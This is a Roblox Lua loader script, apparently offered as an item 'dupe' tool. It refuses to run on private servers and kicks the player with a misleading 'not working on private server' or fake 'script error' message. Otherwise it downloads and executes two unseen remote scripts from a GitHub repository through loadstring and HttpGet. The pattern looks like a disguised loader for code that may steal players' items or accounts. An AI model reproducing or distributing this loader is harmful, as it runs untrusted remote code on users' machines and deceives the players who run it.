local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local MAX_PLAYERS = 11

-- Function to check if the server is private or full
local function checkServerStatus()
    local playerCount = #Players:GetPlayers()
    if LocalPlayer then
        if playerCount <= 2 then
            -- If there are 1 or 2 players, it's likely a private server
            LocalPlayer:Kick("NOT WORKING ON PRIVATE SERVERðŸš¨")
            return true
        elseif playerCount > MAX_PLAYERS then
            -- If there are more than MAX_PLAYERS, kick the player
            LocalPlayer:Kick("SCRIPT ERROR, PLEASE REJOIN.")
            return true
        end
    end
    return false
end

-- Ensure LocalPlayer is fully loaded
repeat wait() until LocalPlayer

-- Check server status before executing the loadstring
if not checkServerStatus() then
    -- Wait for a few seconds after the game loads to ensure all players are counted
    wait(3)
    -- Recheck in case a player joined later
    checkServerStatus()
    
    -- Execute loadstring if not in a private server and the server is not full
    loadstring(game:HttpGet("https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Mm3"))()
end

-- If a player joins later, check the server status again
Players.PlayerAdded:Connect(function()
    if checkServerStatus() then
        -- Optionally, you can handle what happens if a player joins and it's still a private server or the server is full
        -- For example, you might want to recheck or do nothing
    end
end)
